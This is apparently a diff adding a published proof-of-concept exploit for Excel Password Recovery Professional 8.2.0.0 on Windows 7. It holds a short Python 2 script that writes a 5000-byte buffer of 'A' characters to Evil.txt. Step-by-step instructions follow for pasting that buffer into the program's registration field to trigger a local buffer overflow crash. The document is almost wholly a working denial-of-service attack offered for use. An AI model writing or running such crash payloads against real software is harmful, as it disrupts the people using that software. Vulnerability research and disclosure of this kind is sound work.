@@ -1,0 +1,28 @@
+# Exploit Title: Excel Password Recovery Professional 
+# Date: 15-12-2018 
+# Vendor Homepage:https://www.recoverlostpassword.com/
+# Software Link :https://www.recoverlostpassword.com/downloads/excel_password_recovery_pro_trial.exe
+# Exploit Author: Achilles
+# Tested Version: 8.2.0.0
+# Tested on: Windows 7 64
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+ 
+# Steps to Produce the Crash: 
+# 1.- Run python code : Excel_Password_Recovery.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open Excel Password Recovery Professional
+# 4.- Paste the content of EVIL.txt into the field: 'E-Mail and Registrations Code'
+# 5.- Click 'Register' and you will see a crash.
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 5000
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
